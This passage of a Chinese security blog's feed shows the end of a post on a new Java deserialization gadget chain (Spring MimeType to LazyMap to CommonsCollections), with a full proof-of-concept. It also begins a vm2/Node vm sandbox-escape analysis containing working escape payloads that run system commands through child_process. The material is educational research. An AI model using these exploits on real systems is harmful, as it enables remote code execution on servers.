(org.springframework.util)  </span><br><span class="line">invoke0:<span class="number">-1</span>, NativeMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">77</span>, NativeMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">568</span>, <span class="keyword">Method</span> (java.lang.reflect)  </span><br><span class="line">invokeReadObject:<span class="number">1104</span>, ObjectStreamClass (java.io)  </span><br><span class="line">readSerialData:<span class="number">2434</span>, ObjectInputStream (java.io)  </span><br><span class="line">readOrdinaryObject:<span class="number">2268</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject0:<span class="number">1744</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject:<span class="number">514</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject:<span class="number">472</span>, ObjectInputStream (java.io)  </span><br><span class="line">unserializeBase64:<span class="number">38</span>, SerializeUtils (utils)  </span><br><span class="line">main:<span class="number">34</span>, Test (Test)</span><br></pre></td></tr></table></figure><p>MimeType#readObject会调用this.getParameter(“charset”)</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153405.png" alt="image.png"></p><p>getParameter会调用this.parameters.get(“chatset”)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153406.png" alt="image.png"></p><p>parameters正好是Map类型的，我们用反射把变量设置成LazyMap对象即可</p><p>需要注意的是，jdk17中反射修改变量会存在权限问题，所以这里使用unsafe修改parameters变量<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153407.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153079.png" alt="image.png"></p><p>Poc如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Test.java  </span><br><span class="line">package Test;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">import org.springframework.util.MimeType;  </span><br><span class="line">import sun.misc.Unsafe;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.<span class="operator">*</span>;  </span><br><span class="line">  </span><br><span class="line">import utils.<span class="operator">*</span>;  </span><br><span class="line">  </span><br><span class="line">public class Test &#123;  </span><br><span class="line">    public <span class="keyword">static</span> void main(String[] args) throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers <span class="operator">=</span> <span class="keyword">new</span> Transformer[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;getMethod&quot;,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;&quot;getRuntime&quot;,<span class="keyword">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;invoke&quot;,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;exec&quot;, <span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;&quot;open -a Calculator&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedTransformer <span class="operator">=</span> <span class="keyword">new</span> ChainedTransformer(transformers);  </span><br><span class="line">        HashMap map <span class="operator">=</span> <span class="keyword">new</span> HashMap();  </span><br><span class="line">        Map map1 <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Field field <span class="operator">=</span> Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        Unsafe unsafe <span class="operator">=</span> (Unsafe)field.get((Object)<span class="keyword">null</span>);  </span><br><span class="line">        MimeType mimeType <span class="operator">=</span> (MimeType) unsafe.allocateInstance(MimeType.class);  </span><br><span class="line">        unsafe.putObject(mimeType,unsafe.objectFieldOffset(MimeType.class.getDeclaredField(&quot;parameters&quot;)),map1);  </span><br><span class="line">  </span><br><span class="line">        String pld <span class="operator">=</span>  SerializeUtils.serializeBase64(mimeType);  </span><br><span class="line">        SerializeUtils.unserializeBase64(pld);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153408.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文章首发于先知社区&lt;br&gt;使用CodeQL在Spring组件里找到新的入口类MimeType，能够触发到LazyMap#get，进而触发CC</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="CC" scheme="https://jaspersec.top/tags/CC/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="codeql" scheme="https://jaspersec.top/tags/codeql/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>vm2沙盒逃逸源码分析</title>
    <link href="https://jaspersec.top/posts/2134485987.html"/>
    <id>https://jaspersec.top/posts/2134485987.html</id>
    <published>2024-02-07T07:50:00.000Z</published>
    <updated>2025-03-31T22:09:47.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>vm2在2023年7月已经停止维护了，本文仅用作nodejs沙盒逃逸思路的学习。</p><h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><h2 id="vm-API"><a href="#vm-API" class="headerlink" title="vm API"></a>vm API</h2><p>vm的API比较简单，掌握下面这种即可，它结合了其他API命令。</p><ul><li>vm.Script(code)：将要执行的code进行预编译</li><li>script.runInNewContext()：创建和global隔离的作用域（context）当作沙箱，并且执行script的代码</li></ul><p>下面是vm使用模板，运行之后可以发现，沙盒内部代码无法访问到沙盒外部变量global.a</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> cmd = <span class="string">`</span></span><br><span class="line"><span class="string">(()=&gt;&#123;</span></span><br><span class="line"><span class="string">    a = 2;</span></span><br><span class="line"><span class="string">    return a;</span></span><br><span class="line"><span class="string">&#125;)();</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(cmd);</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInNewContext</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);        <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);             <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>vm逃逸的本质是，想办法获取到context外部的对象，然后利用global.process实现命令执行。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702648787232-181d55f2-cd65-4b27-a307-10002fb5fb26.png" alt="图 1-1" title="图 1-1"></p><h2 id="this逃逸"><a href="#this逃逸" class="headerlink" title="this逃逸"></a>this逃逸</h2><p>逃逸点：沙盒里的this默认指向context沙盒。<br>如图1-1所示，context就是沙箱，它由runInNewContext创建，跟进源码会发现context本质就是一个空对象。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702649943505-44c3346e-d5a9-46f7-9fcd-5a879ec7271c.png" alt="image.png"></p><p>而在沙箱内，<strong>this默认就是指向当前作用域，也就是context这个空对象</strong>，下面通过调试验证这个结论。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInNewContext</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">jasper</span> = <span class="string">&quot;is fucking cute&quot;</span>;  <span class="comment">// breakpoint</span></span><br></pre></td></tr></table></figure><p>可以看到，我们在沙盒里对this赋值，context这个对象同样会被赋值，验证了我们的猜想。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702650669090-a21721ba-0083-4f5e-a7b1-9774a95da88d.png" alt="image.png"></p><p>这会导致一个什么问题呢？<br>this指向context，而context显然由外部创建，运行内部代码this却能访问到外部对象context，这就是<strong>逃逸点</strong>。<br>找到逃逸点之后，自然是想办法rce，这里是找Function，然后返回process，调用它的命令执行函数。<br>为什么是this.constructor.constructor呢？了解到Function(‘return process’)()满足要求，问题变成如何获取外部Function，显然通过逃逸点this</p><ul><li>this空对象</li><li>this.constructor           function Object</li><li>this.constructor.constructor     functionFunction</li></ul><p>实际上，Object.constructor 能取到functionFunction，是因为Object继承了Function.prototype，而unction.prototype.constructor &#x3D;&#x3D;&#x3D; Function，具体原因参见原型链污染。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cmd = <span class="string">`</span></span><br><span class="line"><span class="string">(()=&gt;&#123;</span></span><br><span class="line"><span class="string">    const p = this.constructor.constructor(&#x27;return process&#x27;)();</span></span><br><span class="line"><span class="string">    var result = p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">    return result;</span></span><br><span class="line"><span class="string">&#125;)();</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(cmd);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>();</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><p>对于this逃逸，一种修复方案是：将context的原型置为null，这样我们就无法通过原型链获取process了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下图可以看到，使用这种方式创建的context是没有原型对象的，</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702703726979-7dc2a35a-34b4-49cf-a9af-11be09db5b03.png" alt="image.png"></p><h2 id="caller逃逸"><a href="#caller逃逸" class="headerlink" title="caller逃逸"></a>caller逃逸</h2><p>针对this绑定为null的情况，提出的另一种获取外部变量的方式：arguments.callee.caller<br>本质：它会返回自身所在函数的调用者，想办法让外部调用我们定义的函数（钩子函数），即可逃逸。</p><h3 id="toString方式"><a href="#toString方式" class="headerlink" title="toString方式"></a>toString方式</h3><p>通过字符串拼接触发result.toString方法，使得caller为外部变量，进而逃逸、rce。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.1 caller逃逸 toString方式</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cmd =</span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const acc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (acc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(cmd);</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;trigger toString:&quot;</span>+result);</span><br></pre></td></tr></table></figure><h3 id="Proxy方式"><a href="#Proxy方式" class="headerlink" title="Proxy方式"></a>Proxy方式</h3><p>利用proxy对象的get钩子函数，访问任意属性都会触发get函数，使得caller为外部变量，进而逃逸、rce</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.2 caller逃逸 Proxy方式</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(()=&gt;&#123;</span></span><br><span class="line"><span class="string">    var proxy = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function (target, propKey, receiver) &#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">      &#125;);</span></span><br><span class="line"><span class="string">      return proxy;</span></span><br><span class="line"><span class="string">&#125;)();`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> proxy = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="comment">// 这里可以看作“.”操作符作为caller</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(proxy.<span class="property">fuck</span>);</span><br></pre></td></tr></table></figure><h3 id="无回显情况"><a href="#无回显情况" class="headerlink" title="无回显情况"></a>无回显情况</h3><p>若沙盒执行后的返回结果不可控&#x2F;不打印，导致rce不回显，可以利用有try catch的点，通过报错回显。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.3 caller逃逸 Proxy方式 沙箱返回结果不回显，用catch error捕获</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script =</span><br><span class="line"><span class="string">`(()=&gt;&#123;</span></span><br><span class="line"><span class="string">    var proxy = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function (target, propKey, receiver) &#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">      &#125;);</span></span><br><span class="line"><span class="string">      throw proxy;</span></span><br><span class="line"><span class="string">&#125;)();`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">log</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>方法一：直接用npm下载，本人测试过没有问题，比较方便</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2@3.6.4</span><br></pre></td></tr></table></figure><p>方法二：Github clone源码，然后回退，这里回退的版本是3.6.5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/patriksimek/vm2.git</span><br><span class="line">git reset --hard 7ecabb1</span><br></pre></td></tr></table></figure><p>最终的目录结构如下图所示：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702631519924-a5f4c0e5-ca13-4a01-b84a-64d3bc440c88.png" alt="image.png"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>本节主要分析vm2如何利用Proxy代理，实现对上下文的封装，保证沙盒环境安全。</p><ul><li>main.js：底层调用vm的api，实现简单的沙盒执行环境</li><li>contextify.js：封装与解封的核心代码</li><li>cli.js：以命令行运行vm2的文件，不是重点</li><li>sandbox.js：初始化一个沙盒环境，不是重点</li></ul><p>分析vm2如何封装沙盒，主要看main.js和contextify.js两个文件。</p><h3 id="main-js"><a href="#main-js" class="headerlink" title="main.js"></a>main.js</h3><p>main.js主要定义了4个类，并且把它们暴露出去：</p><ul><li><strong>VM</strong>：常用模块，包含vm2这个沙箱的主要逻辑，例如VM.run()方法</li><li>NodeVM：相比 VM 类多了对模块加载的支持，可以理解为VM的升级版</li><li>VMScript：预编译模块</li><li>VMError：错误模块</li></ul><p>重点关注VM类，它负责沙箱初始化和运行代码。<br>首先，看<code>VM#constructor</code>函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">options = &#123;&#125;</span>) &#123;</span><br><span class="line"><span class="variable language_">super</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// defaults</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">options</span> = &#123;</span><br><span class="line"><span class="attr">timeout</span>: options.<span class="property">timeout</span>,</span><br><span class="line"><span class="attr">sandbox</span>: options.<span class="property">sandbox</span>,</span><br><span class="line"><span class="attr">compiler</span>: options.<span class="property">compiler</span> || <span class="string">&#x27;javascript&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> host = &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_context</span> = vm.<span class="title function_">createContext</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>, <span class="string">&#x27;_internal&#x27;</span>, &#123;</span><br><span class="line"><span class="attr">value</span>: vm.<span class="title function_">runInContext</span>(<span class="string">`(function(require, host) &#123; <span class="subst">$&#123;cf&#125;</span> \n&#125;)`</span>, <span class="variable language_">this</span>.<span class="property">_context</span>, &#123;</span><br><span class="line"><span class="attr">filename</span>: <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/contextify.js`</span>,</span><br><span class="line"><span class="attr">displayErrors</span>: <span class="literal">false</span></span><br><span class="line">&#125;).<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">_context</span>, <span class="built_in">require</span>, host)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare global sandbox</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">sandbox</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;object&#x27;</span> !== <span class="keyword">typeof</span> <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">sandbox</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">VMError</span>(<span class="string">&quot;Sandbox must be object.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> name <span class="keyword">in</span> <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">sandbox</span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_internal</span>.<span class="property">Contextify</span>.<span class="title function_">globalValue</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">sandbox</span>[name], name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意两个点，第一个是11行的host，它包含了一些常用对象，后面会知道，host里是给沙盒使用的外部对象。<br>第二个15行，它的逻辑是把contextify.js包装在一个匿名函数里，然后把函数返回结果存入<code>this._internal</code>。<br>其次，看VM#run这个函数，它负责在沙盒中运行危险代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">run</span>(<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">compiler</span> !== <span class="string">&#x27;javascript&#x27;</span>) &#123;</span><br><span class="line">code = <span class="title function_">_compileToJS</span>(code, <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">compiler</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = code <span class="keyword">instanceof</span> <span class="title class_">VMScript</span> ? code : <span class="keyword">new</span> <span class="title class_">VMScript</span>(code);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_internal</span>.<span class="property">Decontextify</span>.<span class="title function_">value</span>(script.<span class="title function_">compile</span>().<span class="property">_compiled</span>.<span class="title function_">runInContext</span>(<span class="variable language_">this</span>.<span class="property">_context</span>, &#123;</span><br><span class="line"><span class="attr">filename</span>: script.<span class="property">filename</span>,</span><br><span class="line"><span class="attr">displayErrors</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">timeout</span>: <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">timeout</span></span><br><span class="line">&#125;));</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="variable language_">this</span>.<span class="property">_internal</span>.<span class="property">Decontextify</span>.<span class="title function_">value</span>(e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 第9行，它返回的是<code>this._internal.Decontextify.value(代码运行结果)</code>，之后会了解到，这是对沙盒里运行的危险代码的返回结果做了一个解封装的操作。<br>main.js的作用就是暴露出这四个类供用户使用，例如在调试代码的第1行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 